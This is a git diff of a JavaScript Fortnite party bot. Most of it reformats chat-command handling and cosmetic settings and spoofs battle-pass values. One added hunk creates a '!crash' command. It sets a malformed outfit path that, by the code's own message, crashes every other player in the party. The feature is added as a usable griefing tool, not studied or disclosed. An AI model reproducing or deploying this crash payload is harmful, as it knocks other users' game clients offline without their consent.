@@ -81,7 +81,7 @@ function sleep(milliseconds) {
               partyBuildId: '1:1:' + netcl,
               });
 
-              //                          Name of playlist  Playlist ID
+                                        //Name of playlist  Playlist ID
              await fortnite.party.setPlaylist('The End', 'Playlist_Music_High')
              // https://jsonstorage.net/api/items/47c6b54c-b978-4122-ad66-e0f8071cf5d9 for playlists
 
@@ -103,7 +103,7 @@ function sleep(milliseconds) {
                   if(fortnite.party.members.length == 1) return {
                   }
                   return console.log(`[PARTY MEMBER] ${profile.displayName} has left the party.`)
-                  });  
+                  });
 
                   fortnite.communicator.on('party:member:promoted', async (member) => {
                     var profile = await eg.getProfile(member.id)
@@ -125,30 +125,29 @@ function sleep(milliseconds) {
                   fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters/" + CID  + "." + CID);
 
                   fortnite.party.me.setBackpack("/Game/Athena/Items/Cosmetics/Backpacks/" + BID + "." + BID);
-          
+           
                   fortnite.party.me.setPickaxe("/Game/Athena/Items/Cosmetics/Pickaxes/" + PICKAXE_ID + "." + PICKAXE_ID); // ALL OF THE THINGS ARE PULLED FROM ABOVE!
-          
+           
                   fortnite.party.me.setEmote("/Game/Athena/Items/Cosmetics/Dances/" + EID + "." + EID);
-          
-                  fortnite.party.me.setBattlePass(true, 100, 999999999, 999999999);
-          
+           
+                  fortnite.party.me.setBattlePass(true, 1000, 1000, 100, 100);
+           
                   fortnite.party.me.setBanner(config.level, config.banner, config.banner_color);
                 }
                 else{
                   console.log('[PARTY MEMBER] ' + profile.displayName + ', Has joined!')
                   console.log(`[PARTY COUNT] Members count: ${fortnite.party.members.length}`);
+                  fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters/" + CID  + "." + CID);
 
-                    fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters/" + CID  + "." + CID);
-
-                    fortnite.party.me.setBackpack("/Game/Athena/Items/Cosmetics/Backpacks/" + BID + "." + BID);
-            
-                    fortnite.party.me.setPickaxe("/Game/Athena/Items/Cosmetics/Pickaxes/" + PICKAXE_ID + "." + PICKAXE_ID); // ALL OF THE THINGS ARE PULLED FROM ABOVE!
-            
-                      fortnite.party.me.setEmote("/Game/Athena/Items/Cosmetics/Dances/" + EID + "." + EID);
-            
-                    fortnite.party.me.setBattlePass(true, 1000, 1000, 100, 100);
-            
-                    fortnite.party.me.setBanner(config.level, config.banner, config.banner_color);
+                  fortnite.party.me.setBackpack("/Game/Athena/Items/Cosmetics/Backpacks/" + BID + "." + BID);
+           
+                  fortnite.party.me.setPickaxe("/Game/Athena/Items/Cosmetics/Pickaxes/" + PICKAXE_ID + "." + PICKAXE_ID); // ALL OF THE THINGS ARE PULLED FROM ABOVE!
+           
+                  fortnite.party.me.setEmote("/Game/Athena/Items/Cosmetics/Dances/" + EID + "." + EID);
+           
+                  fortnite.party.me.setBattlePass(true, 1000, 1000, 100, 100);
+           
+                  fortnite.party.me.setBanner(config.level, config.banner, config.banner_color);
                 }
                 });
 
@@ -167,6 +166,16 @@ function sleep(milliseconds) {
             }
           }
 
+          function crash() {
+            if (fortnite.party.members.length < 1) {
+           return fortnite.communicator.sendMessage(data.friend.id, `Theres no point when the the bot is alone :(.`);
+           }
+           fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
+           fortnite.communicator.sendMessage(data.friend.id, `Crashed everyone in the party!`);
+           console.log('[BOT UNUSEDABLE] The bot now crashes you if you invite it, restart the bot to fix this.')
+           console.log('[BOT UNUSEDABLE] This was caused by the crash command.')
+          }
+
           var partyleader;
 
           if (fortnite.party.members.length == 1) {
@@ -176,6 +185,7 @@ function sleep(milliseconds) {
         }
 
           function members() {
+            fortnite.communicator.sendMessage(data.friend.id, "Party Info");
             if (fortnite.party.members.length > 1) {
             fortnite.communicator.sendMessage(data.friend.id, `There is ${fortnite.party.members.length} members in the party!`);
             if(partyleader.displayName === eg.account.displayName) {
@@ -212,6 +222,7 @@ function sleep(milliseconds) {
                                     if(data.message === 'EID_') return fortnite.communicator.sendMessage(data.friend.id, "Please mention a eid.");
                                     try {
                                     EID = args[0];
+                                  fortnite.party.me.clearEmote()
                                   fortnite.party.me.setEmote("/Game/Athena/Items/Cosmetics/Dances/" + args[0] + "." + args[0]);
                                   fortnite.communicator.sendMessage(data.friend.id, "Emote set to " + args[0]);
                                 }
@@ -231,6 +242,15 @@ function sleep(milliseconds) {
                                 fortnite.communicator.sendMessage(data.friend.id, err);
                               }
                             }
+
+                            if(command === '!crash') {
+                              try {
+                                crash();
+                                }
+                              catch(err) {
+                              fortnite.communicator.sendMessage(data.friend.id, err);
+                            }
+                          }
       
                             if(data.message.startsWith('BID_')) {
                               if(data.message === 'BID_') return fortnite.communicator.sendMessage(data.friend.id, "Please mention a bid id.");
@@ -246,7 +266,6 @@ function sleep(milliseconds) {
 
                               if(command === '!party') {
                                 try {
-                                fortnite.communicator.sendMessage(data.friend.id, "Party Info");
                                   members();
                                     }
                                     catch(err) {
@@ -305,6 +324,7 @@ function sleep(milliseconds) {
                             }).then(query => {
                               Object.keys(query).forEach(function(key) {
                                 if(query[key].type == "Emote") {
+                                  fortnite.party.me.clearEmote()
                                 fortnite.party.me.setEmote("/Game/Athena/Items/Cosmetics/Dances/" + query[key].id + "." + query[key].id);
                                 fortnite.communicator.sendMessage(data.friend.id, "Found " + query[key].displayName + ', the id is ' + query[key].id);
                                 }
@@ -415,13 +435,13 @@ function sleep(milliseconds) {
                               }
 
                           if(command === "!leave") {
-                        try {
-                         leave()
+                            try {
+                            leave()
+                                }
+                              catch(err) {
+                                fortnite.communicator.sendMessage(data.friend.id, "There was a error: " + err);
+                              }
                             }
-                          catch(err) {
-                            fortnite.communicator.sendMessage(data.friend.id, "There was a error: " + err);
-                          }
-                        }
 
                         if(command === "!friend") {
                       if (!args[1]) return fortnite.communicator.sendMessage(data.friend.id, "Please mention a epic name to add.");
@@ -485,9 +505,9 @@ function sleep(milliseconds) {
                     }
 
 
-        });
+                    });
 
-        fortnite.communicator.updateStatus(config.status);
+                    fortnite.communicator.updateStatus(config.status);
 
-      });
-    });
+                  });
+                });
